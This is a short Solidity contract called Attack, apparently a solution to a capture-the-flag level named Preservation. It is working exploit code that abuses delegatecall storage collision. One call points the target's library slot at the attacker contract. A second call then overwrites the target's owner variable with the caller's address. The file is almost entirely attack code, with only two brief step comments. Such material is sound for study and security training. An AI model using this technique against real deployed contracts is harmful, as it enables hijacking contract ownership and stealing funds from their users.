// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "hardhat/console.sol";

import "./Preservation.sol";

contract Attack {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;

    Preservation public immutable preservationContract;

    constructor(address _preservationContract) {
        preservationContract = Preservation(_preservationContract);
    }

    // Step 1: Set the timeZoneLubrary address to be this address
    function setLibraryToAttackAddress() external {
        preservationContract.setFirstTime(uint256(uint160((address(this)))));
    }

    // Step2: Set the owner of the Preservation contract
    function SetOwnerOfPreservationContract() external {
        preservationContract.setFirstTime((uint256(uint160(msg.sender))));
    }

    function setTime(uint _owner) external {
        owner = address(uint160(_owner));
    }
}
